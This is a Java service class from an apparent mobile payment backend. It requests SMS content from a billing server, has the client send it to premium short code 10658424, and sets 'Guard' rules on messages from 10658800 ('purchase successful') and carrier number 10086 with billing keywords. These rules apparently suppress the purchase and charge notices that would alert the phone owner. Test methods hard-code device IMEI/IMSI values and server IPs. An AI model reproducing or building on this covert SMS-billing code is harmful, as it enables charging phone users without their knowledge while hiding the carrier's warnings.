package com.jxt.pay.appclient.service.dynamic.net;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.log4j.Logger;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sets;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;
import com.jxt.pay.appclient.utils.PostData;
import com.jxt.pay.appclient.utils.SingleXmlUtil;
import com.jxt.pay.appclient.utils.StringUtils;

/**
 * 强联网
 * http://42.121.115.156:9980/mmnet

HTTP  POST:
1、init
req:
<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><NetInitReq><MsgType>NetInitReq</MsgType><AppID>14001</AppID><Imsi></Imsi><Imei></Imei><UA></UA></NetInitReq>

response:
<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><NetInitResp><MsgType>NetInitResp</MsgType><Return>0</Return><Content>xxxxx</Content><Sid>1</Sid></NetInitResp>

2、confirm init
req:
<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><NetConfirmInitReq><MsgType>NetConfirmInitReq</MsgType><AppID>14001</AppID><Imsi></Imsi><Imei></Imei><UA></UA><Sid>1</Sid></NetConfirmInitReq>

response:
<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><NetConfirmInitResp><MsgType>NetConfirmInitResp</MsgType><Return>0</Return></NetConfirmInitResp>

3、pay
req:
<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><NetBillReq><MsgType>NetBillReq</MsgType><AppID>14001</AppID><PayCode>1</PayCode><Imsi></Imsi><Imei></Imei><UA></UA></NetBillReq>

response:
<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><NetBillResp><MsgType>NetBillResp</MsgType><Return>0</Return><TradeId></TradeId></NetBillResp>

 * 
 * @author leoliu
 *
 */
public class LxtxSmm1DynamicService implements IDynamicService{

	private static Logger logger = Logger.getLogger(LxtxSmm1DynamicService.class);
	
	private static final String TYPE = "lxtxSmm1";
	
	private static final String PARAM1 = "MsgType=NetInitReq&AppID={appid}&Imsi={imsi}&Imei={imei}&UA=Huawei";
	private static final String PARAM2 = "MsgType=NetConfirmInitReq&AppID={appid}&Imsi={imsi}&Imei={imei}&UA=Huawei&Sid={sid}";
	private static final String PARAM3 = "MsgType=NetBillReq&AppID={appid}&PayCode={payCode}&Imsi={imsi}&Imei={imei}&UA=Huawei";
	
	private static final String DEST = "10658424";
	
	private int timeOut = 60;
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final Guard guard1 = new Guard("10658800","成功购买",2880,"1",0);
	private static final Guard guard2 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard3 = new Guard("10658800","",960,null,1);
	private static final Guard guard4 = new Guard("10086","",960,null,1);
	
	@Override
	public String getType() {
		return TYPE;
	}

	private Map<String, Long> tryMap = new HashMap<String, Long>();
	
	@Override
	public String dynamic(Map<String, String> map) {
		String theNo = map.get("theNo");
		
		if("1".equals(theNo)){
			return firstDynamic(map);
		}else if("2".equals(theNo)){
			return secondDynamic(map);
		}else if("3".equals(theNo)){
			return thirdDynamic(map);
		}
		
		return null;
	}
	
	public String firstDynamic(Map<String, String> map) {
		String xml = null;
		
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String appid = StringUtils.defaultString(map.get("appid"));
			String imsi = StringUtils.defaultString(map.get("imsi"));
			String imei = StringUtils.defaultString(map.get("imei"));
			
			String param = PARAM1.replace("{appid}",appid).replace("{imsi}",imsi).replace("{imei}",imei);
			
			String responseXml = GetData.getData(url,param);
			
			xml = parseFirst(map,responseXml);
			
			if(xml != null && xml.length() > 0){
				tryMap.remove(channel);
			}else{
				return DynamicUtils.parseWait(10,map);
			}
		}
		
		return xml;
	}

	private String parseFirst(Map<String, String> map,String responseXml){
		
		if(responseXml != null && responseXml.length() > 0){
			logger.info("parse first : "+responseXml);
			
			String status = SingleXmlUtil.getNodeValue(responseXml, "Return");
			
			if("0".equals(status)){
				String content = SingleXmlUtil.getNodeValue(responseXml, "Content");
				
				if(content != null && content.length() > 10){
					
					Sms sms = new Sms();
					
					sms.setSmsContent(content);
					sms.setSmsDest(DEST);
					sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
					
					String sid = SingleXmlUtil.getNodeValue(responseXml, "Sid");
					
					Sets sets = new Sets();
					sets.setKey("sid");
					sets.setValue(sid);
					
					return XstreamHelper.toXml(sms).append(XstreamHelper.toXml(sets)).append("<wait>5</wait>").toString();
				}
			}else if("1".equals(status)){
				Sets sets = new Sets();
				sets.setKey("sid");
				sets.setValue("0");
				
				return XstreamHelper.toXml(sets).toString();
			}
		}
		
		return null;
	}
	
	private Map<String, Long> tryMap1 = new HashMap<String, Long>();
	
	private String secondDynamic(Map<String, String> map){
		
		String xml = null;
		
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String sid = map.get("sid");
			
			if("0".equals(sid)){
				return "<wait>1</wait>";
			}else{
				Calendar cal = Calendar.getInstance();
				Long startTime = tryMap1.get(sid);
				
				if(startTime == null){
					startTime = cal.getTimeInMillis();
					tryMap1.put(sid,startTime);
				}else{
					if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
						tryMap1.remove(sid);
						return DynamicUtils.parseError("599");
					}
				}
				
				String appid = StringUtils.defaultString(map.get("appid"));
				String imsi = StringUtils.defaultString(map.get("imsi"));
				String imei = StringUtils.defaultString(map.get("imei"));
				
				String param = PARAM2.replace("{appid}",appid).replace("{imsi}",imsi).replace("{imei}",imei).replace("{sid}",sid);
				
				String responseXml = GetData.getData(url,param);
				
				xml = parseSecond(map,responseXml);
				
				if(xml != null && xml.length() > 0){
					tryMap.remove(sid);
				}else{
					logger.info("responseXml is null");
					return DynamicUtils.parseWait(10,map);
				}
			}
			
		}
		
		return xml;
	}
	
	private String parseSecond(Map<String, String> map,String responseXml){
		
		if(responseXml != null && responseXml.length() > 0){
			logger.info("parse second : "+responseXml);
			
			String Return = SingleXmlUtil.getNodeValue(responseXml, "Return");
			
			if("0".equals(Return)){
				return "<wait>1</wait>";
			}else if("-1024".equals(Return)){//移动没有收到
				return DynamicUtils.parseWait(7,map);
			}else{
				return DynamicUtils.parseError("597");
			}
		}
		
		return null;
	}
	
	private Map<String, Long> tryMap2 = new HashMap<String, Long>();
	
	private String thirdDynamic(Map<String, String> map){
		String xml = null;
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap2.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap2.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap2.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String appid = StringUtils.defaultString(map.get("appid"));
			String imsi = StringUtils.defaultString(map.get("imsi"));
			String imei = StringUtils.defaultString(map.get("imei"));
			String payCode = StringUtils.defaultString(map.get("payCode"));
			
			String param = PARAM3.replace("{appid}",appid).replace("{payCode}",payCode).replace("{imsi}",imsi).replace("{imei}",imei);
			
			String responseXml = GetData.getData(url,param);
			
			xml = parseThird(map,responseXml);
			
			if(xml == null){
				xml = DynamicUtils.parseWait(7,map);
			}else{
				map.remove(channel);
			}
		}
		
		return xml;
	}
	
	private String parseThird(Map<String, String> map,String responseXml){
		
		if(responseXml != null && responseXml.length() > 0){
			logger.info("parse third : "+responseXml);
			
			String Return = SingleXmlUtil.getNodeValue(responseXml, "Return");
			
			if("0".equals(Return)){
				Sms sms = new Sms();
				
				List<Guard> guardList = new ArrayList<Guard>();
				guardList.add(guard1);
				guardList.add(guard2);
				guardList.add(guard3);
				guardList.add(guard4);
				
				sms.setGuardList(guardList);
				
				return XstreamHelper.toXml(sms).toString();
			}else{
				return DynamicUtils.parseError("596");
			}
		}
		
		return null;
	}
	
	public static void main(String[] args){
		
		test1();
	}
	
	private static void test1(){
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", "http://119.29.52.164:8090/mm/mm1.do");
		map.put("channel", "106208a001001001");
		map.put("appid", "300008817017");
		map.put("imei","869460011612203");
		map.put("imsi", "460028174282753");
		map.put("theNo","1");		
		
		String xml = new LxtxSmm1DynamicService().dynamic(map);
		
		logger.info(xml);
	}
	
	private static void test2(){
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", "http://119.29.52.164:8090/mm/mm1.do");
		map.put("appid", "300008817017");
		map.put("imei","869460011612203");
		map.put("imsi", "460028174282753");
		map.put("theNo","2");
		map.put("sid", "177290046");
		
		String xml = new LxtxSmm1DynamicService().dynamic(map);
		
		logger.info(xml);
		
	}
	
	private static void test3(){
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", "http://119.29.52.164:8090/mm/mm1.do");
		map.put("channel", "106208a001001001");
		map.put("appid", "300008817017");
		map.put("payCode","30000881701706");
		map.put("imei","869460011612203");
		map.put("imsi", "460028174282753");
		map.put("theNo","3");		
		
		String xml = new LxtxSmm1DynamicService().dynamic(map);
		
		logger.info(xml);
	}
}
